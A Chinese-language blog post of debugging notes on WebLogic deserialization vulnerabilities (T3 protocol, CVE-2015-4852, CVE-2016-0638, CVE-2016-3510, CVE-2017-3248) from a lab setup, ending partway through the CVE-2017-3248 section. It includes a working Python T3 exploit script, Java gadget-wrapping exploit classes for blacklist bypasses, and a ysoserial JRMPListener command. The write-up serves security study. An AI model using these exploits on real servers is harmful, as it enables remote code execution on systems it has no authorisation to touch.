<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta name="description" content="">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        Weblogic漏洞调试笔记 - undefined
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpeg" />
        </div>
        <div class="name">
            <i>seaii</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>COLLECT</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x01 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#T3"><span class="toc-text">T3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-text">CVE-2017-3248</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-text">CVE-2018-2628</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-2893"><span class="toc-text">CVE-2018-2893</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-3245"><span class="toc-text">CVE-2018-3245</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-3191"><span class="toc-text">CVE-2018-3191</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLDecoder"><span class="toc-text">XMLDecoder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-3506"><span class="toc-text">CVE-2017-3506</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-10271-x2F-CVE-2017-10352"><span class="toc-text">CVE-2017-10271&#x2F;CVE-2017-10352</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2725"><span class="toc-text">CVE-2019-2725</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#UnitOfWorkChangeSet"><span class="toc-text">UnitOfWorkChangeSet</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#com-sun-rowset-JdbcRowSetImpl"><span class="toc-text">com.sun.rowset.JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#org-slf4j-ext-EventData"><span class="toc-text">org.slf4j.ext.EventData</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2729"><span class="toc-text">CVE-2019-2729</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-text">防御</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-CVE-2018-2894"><span class="toc-text">文件上传(CVE-2018-2894)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%BD%A9%E8%9B%8B"><span class="toc-text">小彩蛋</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x03 参考链接</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        Weblogic漏洞调试笔记
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-12-29 11:48:00</span></span>
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>java知识补漏行动最后一站——weblogic。知识从来是越学越多的，何况java博大精深，想在短时间全部掌握根本不可能。但是经过这一波学习之后，再遇到java的漏洞至少不会束手无策了，“不懂java”也不再是借口了，2333333。</p>
<p>由于weblogic的补丁收费，所以文章中补丁大多是其他师傅文章中的内容，基本都已标明出处。如有遗漏，请联系我添加，并表示深深的歉意。</p>
<span id="more"></span>


<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>大佬已经为我们提供了非常方便的集成调试环境：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a>，按照readme操作即可。</p>
<p>接下来是idea的配置，首先打开从docker环境中复制出来的<code>wlserver</code>目录，然后将复制出来的<code>module</code>、<code>wlserver/server/lib</code>添加到library。</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/image-20190819104929880.png"></p>
<p>然后新建一个远程调试。</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/image-20190819105338390.png"></p>
<p>完成～</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>weblogic的漏洞中反序列化占大头，反序列化漏洞大体上又分为两类，一类是T3协议，另一类<del>也是T3</del>是XMLDeocder。此外，还有xxe、文件上传等等漏洞。</p>
<h3 id="T3"><a href="#T3" class="headerlink" title="T3"></a>T3</h3><p>在学习java反序列化漏洞的过程中，不可避免的会碰到RMI，JNDI、JRMP等等名词，先记录一下个人的理解（可能有些片面和不准确）。</p>
<p>其实这几个名词的核心就是java的分布式编程，在主机B上封装了一系列的方法供主机A上的java程序来调用，在这个过程中用到的一些协议和技术。先来一张图：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/jndiarch.gif"></p>
<p>我们按图从上到下来说，首先是<strong>JNDI</strong>，官方语言是这样的：</p>
<blockquote>
<p>JNDI(Java Naming and Directory Interface)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。</p>
</blockquote>
<p>当java需要调用远程服务的时候，需要通过JNDI来寻找可用的远程服务，常见的有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">rmi://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">ldap://&lt;domain&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure>

<p>这几个都是我们在反序列化漏洞利用非常常见的。</p>
<p>接下来是<strong>RMI</strong>：</p>
<blockquote>
<p>RMI(Remote Method Invocation)即远程方法调用。能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输和分布垃圾收集。</p>
</blockquote>
<p>便于理解，我们可以把RMI类比为一个提供api的server，那么client与server之间通信就需要通信协议，Java RMI的默认基础通信协议就是<strong>JRMP</strong>。</p>
<p>最后，就是<strong>T3</strong>，这是weblogic RMI所使用的协议，weblogic RMI是java RMI的一种加强版实现。</p>
<p>接下来我们通过wireshark抓包来看一下T3协议具体的通信过程：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191121163959.png"></p>
<p>首先是一个握手包，客户端与服务端通过这次握手来确定双方的身份。如果握手成功，就继续通信。</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191121165317.png"></p>
<p>看一下请求包的结构，首先标出的4个字节是整个数据包的长度，接下来是从<code>01 65</code>一直到<code>fe010000</code>前面是T3协议的协议头。看到<code>aced0005</code>就非常熟悉了，是反序列化数据的魔术头。一个数据包中可以有好几个反序列化字符串，测试之后发现只有第一个<code>aced</code>前面要加<code>fe100000</code>。所以现在我们就把T3协议的数据包结构理清楚了：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191121180003.png"></p>
<p>显然数据包是我们可控的，只要将正常的反序列化数据替换为我们的恶意数据，或者只保留恶意数据，然后重新计算数据包长度，就可以让weblogic反序列化我们传入的恶意数据。</p>
<p>说了这么多，只是为了将java这些令人头大的名词理解清楚，并理解T3协议的原理，为漏洞分析打好基础，下面不多说，开整！</p>
<h4 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h4><p><code>server/lib/wlthint3client.jar!/weblogic/rjvm/InboundMsgAbbrev.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191121182033.png"></p>
<p>这个漏洞确实没什么好说的，所有T3协议的请求都会在这个方法中处理。没有任何过滤，weblogic提供了反序列化的入口，gadget使用的是CommonCollection1。调用栈如下：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191121183845.png"></p>
<p>附上利用脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handshake</span>(<span class="params">host, port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">return</span> version[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(version) &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;/path/to/ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    <span class="comment">#print(binascii.b2a_hex(payload).decode())</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    command = <span class="string">&quot;touch /tmp/success&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#payload = get_payload1(gadget, command)</span></span><br><span class="line">    payload = get_payload2(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment">#payload = binascii.a2b_hex(b&quot;&quot;)</span></span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>

<h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h5><p>在这个漏洞出现之后，weblogic开始对反序列化漏洞进行防御，但是是基本黑名单的防御方式。一旦黑名单被绕过，防护就会被打破，所以在之后weblogic陷入了绕过-加黑名单-绕过的循环之中。</p>
<blockquote>
<p>Weblogic的反序列化的点有着三个,黑名单<code>ClassFilter.class</code>也作用于这三个位置。</p>
<ul>
<li><code>weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</code></li>
<li><code>weblogic.rjvm.MsgAbbrevInputStream.class</code></li>
<li><code>weblogic.iiop.Utils.class</code></li>
</ul>
</blockquote>
<h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p>在说这个漏洞之前需要一点前置知识，<code>transient</code>关键字和java反序列化中的<code>Externalizable</code>。</p>
<p><strong>Externalizable</strong></p>
<blockquote>
<p>Externalizable接口extends Serializable接口，而且在其基础上增加了两个方法：writeExternal()和readExternal()。这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊的操作。</p>
</blockquote>
<p><strong>transient</strong></p>
<blockquote>
<p> 在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化，这些信息对应的变量就可以加上transient关键字。换句话说，这个字段的生命周期仅存于调用者的内存中而不会写到磁盘里持久化。</p>
</blockquote>
<p>由此我们找到了<code>server/lib/weblogic.jar!/weblogic/jms/common/StreamMessageImpl.class</code>来进行绕过：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191123000141.png"></p>
<p>可以看到在<code>readExternal</code>方法中对writeExternal写入的数据又进行了一次反序列化，图中的var5实质上就是我们传入的恶意反序列化数据。</p>
<p>这里exp构造起来稍微有一点复杂，首先需要定义一个<code>StreamMessageImpl</code>，重写它的<code>writeExternal</code>方法，然后将我们的payload封装进去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.jms.common; <span class="comment">//重要，与weblogic源码保持一致</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> javax.jms.JMSException;</span><br><span class="line"><span class="keyword">import</span> javax.jms.StreamMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">StreamMessageImpl</span> <span class="keyword">extends</span> <span class="title class_">MessageImpl</span> <span class="keyword">implements</span> <span class="title class_">StreamMessage</span>, Externalizable &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7748687583664395357L</span>; <span class="comment">//必须</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">byte</span>[] buffer; <span class="comment">//增加transient关键字，不对这个属性进行序列化操作</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StreamMessageImpl</span><span class="params">(<span class="type">byte</span>[] buffer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.buffer = buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//重写方法，写入恶意数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput var1)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.writeExternal(var1);</span><br><span class="line">        var1.writeByte(<span class="number">1</span>);</span><br><span class="line">        var1.writeInt(<span class="built_in">this</span>.buffer.length);</span><br><span class="line">        var1.write(<span class="built_in">this</span>.buffer);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//后面有一大堆继承抽象类和实现接口要写的方法，不是重点，直接省略</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.seaii.unser.exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollection1</span> <span class="keyword">extends</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">  	<span class="comment">//ysoserial CommonCollections1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;touch /tmp/streamMessage&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">StreamMessageImpl</span> <span class="variable">streamMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamMessageImpl</span>(buffer);</span><br><span class="line">        ser(streamMessage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><p>此次绕过使用的是<code>weblogic.corba.utils.MarshalledObject</code>，具体来看代码：</p>
<p><code>server/lib/weblogic.jar!/weblogic/corba/utils/MarshalledObject.class</code></p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191122163609.png"></p>
<p><code>MarshalledObject</code>会将其封装的数据进行一次序列化。</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191122163210.png"></p>
<p>由于不再黑名单中，就绕过了过滤正常反序列化，此时<code>MarshalledObject</code>就会将我们的封装进去的恶意数据反序列化，成功利用漏洞。</p>
<p>exp可通过简单仿照ysoserial来写，将生成的反序列化数据放在上面的py脚本中即可：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.seaii.unser.exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.seaii.unser.exp.Exp;</span><br><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollection1</span> <span class="keyword">extends</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">  	<span class="comment">//ysoserial CommonCollections1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;touch /tmp/marshall&quot;</span>);</span><br><span class="line">        <span class="type">MarshalledObject</span> <span class="variable">marshalledObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalledObject</span>(object);</span><br><span class="line">        <span class="comment">//unser(object);</span></span><br><span class="line">        ser(marshalledObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><p>这次绕过利用的是JRMPClient，之前提到过，JRMP是Java RMI的默认基础通信协议，这种利用方式我们在shiro的反序列化利用中也有过了解。基本原理是通过应用的反序列化漏洞构造一个JRMP的client，去连接我们预置的恶意server，client读取server返回的数据，然后反序列化，触发漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 &quot;touch /tmp/JRMP&quot; #server端，本地运行</span><br></pre></td></tr></table></figure>

<p>漏洞出现之后，weblogic在<code>modules/com.bea.core.weblogic.rmi.client_1.11.0.0.jar!/weblogic/rjvm/InboundMsgAbbrev.class</code>增加了如下过滤（没钱买补丁只能盗图。。）：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/2384e13d-722f-4459-8b75-db6fddc25307.png"></p>
<p>补丁图片来自<a target="_blank" rel="noopener" href="https://paper.seebug.org/584/">Weblogic 反序列化漏洞(CVE-2018-2628)漫谈</a>。</p>
<p>为什么要这么修呢？看一下ysoserial中的payload JRMPClient是怎么写的：</p>
<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20191126153325.png"></p>
